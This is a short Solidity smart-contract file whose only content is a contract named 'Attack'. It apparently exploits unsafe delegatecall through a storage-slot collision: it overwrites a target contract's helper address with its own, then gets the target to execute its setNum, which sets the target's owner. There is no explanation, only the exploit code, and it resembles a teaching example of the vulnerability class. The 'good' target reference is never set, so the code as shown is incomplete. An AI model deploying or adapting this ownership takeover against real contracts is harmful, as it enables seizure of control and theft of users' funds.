// SPDX-License-Identifier: MIT
//Address: 
pragma solidity ^0.8.7;

interface IGood {
    function setNum(uint _num)  external;
}

contract Attack {
    address public helper;
    address public owner;
    uint public num;
    IGood public good;

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}